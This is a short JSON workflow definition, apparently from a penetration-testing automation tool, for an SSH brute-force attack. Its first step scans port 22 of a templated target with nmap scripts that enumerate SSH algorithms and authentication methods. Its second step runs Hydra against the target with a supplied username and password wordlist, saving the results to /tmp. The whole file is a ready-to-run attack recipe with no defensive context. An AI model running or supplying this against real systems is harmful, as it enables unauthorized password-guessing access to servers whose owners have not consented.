{
  "name": "brute_ssh",
  "description": "SSH brute-force attack using Hydra with a username and wordlist.",
  "author": "james-linux",
  "version": "1.0",
  "requires_root": false,
  "steps": [
    {
      "id": "nmap_ssh_check",
      "action": "nmap.scan",
      "params": {
        "target": "{{target}}",
        "ports": "22",
        "flags": "-sV --script ssh2-enum-algos,ssh-auth-methods"
      },
      "description": "Verify SSH service and enumerate auth methods"
    },
    {
      "id": "hydra_ssh",
      "action": "layer.run",
      "params": {
        "command": "hydra -l {{username}} -P {{wordlist}} {{target}} ssh -t 4 -f -o /tmp/james_hydra_ssh.txt",
        "timeout": 600
      },
      "description": "Hydra SSH password brute-force"
    }
  ],
  "category": "brute-force"
}
